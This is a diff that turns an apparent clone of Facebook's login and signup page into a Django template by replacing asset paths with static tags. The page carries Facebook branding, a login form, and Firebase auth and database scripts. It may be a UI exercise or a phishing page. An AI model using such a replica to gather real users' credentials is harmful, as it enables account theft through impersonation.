@@ -1,9 +1,11 @@
+{% load static %}
+
 <!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-<link rel="stylesheet" type="text/css" href="css/computer.css" media="screen and (min-width: 769px)">
-<link rel="stylesheet" type="text/css" href="css/mobile.css" media="screen and (max-width: 768px)">
+<link rel="stylesheet" type="text/css" href="{% static 'home/css/computer.css' %}" media="screen and (min-width: 769px)">
+<link rel="stylesheet" type="text/css" href="{% static 'home/css/mobile.css' %}" media="screen and (max-width: 768px)">
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
 <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
@@ -14,7 +16,7 @@
 <div class="computer">
   <header>
     <div class="headersubdiv">
-      <img src="images/fblogo.png" class="fblogo">
+	    <img src="{% static 'home/images/fblogo.png' %}" class="fblogo">
       <div class="loginform">
         <table>
           <tr>
@@ -39,7 +41,7 @@
       <div class="welcome">
         <div class="welcometext">Facebook helps you connect and share with the people in your life.</div>
         <div class="welcomepic">
-          <img src="images/connecting.png" alt="welcome">
+		<img src="{% static 'home/images/connecting.png' %}" alt="welcome">
         </div>
       </div>
       <div class="signupdiv">
@@ -184,11 +186,11 @@
 
 <div class="mobile">
   <div class="mobheader">
-    <img src="images/fblogo.png" class="mobfblogo">
+	  <img src="{% static 'home/images/fblogo.png' %}" class="mobfblogo">
   </div>
   <div id="mobapplink" class="clearfix">
     <a href="#">
-      <img src="images/fbandroid.png" id="mobandroidpic">
+	    <img src="{% static 'home/images/fbandroid.png' %}" id="mobandroidpic">
       <div id="getfbandroid">Get Facebook for Android and browse faster.</div>
     </a>
   </div>
@@ -242,5 +244,5 @@
 		<script src="https://www.gstatic.com/firebasejs/7.14.0/firebase-auth.js"></script>
 		<script src="https://www.gstatic.com/firebasejs/7.14.0/firebase-database.js"></script>
 
-		<script src="db.js"></script>
+		<script src="{% static 'home/db.js' %}"></script>
 </body>
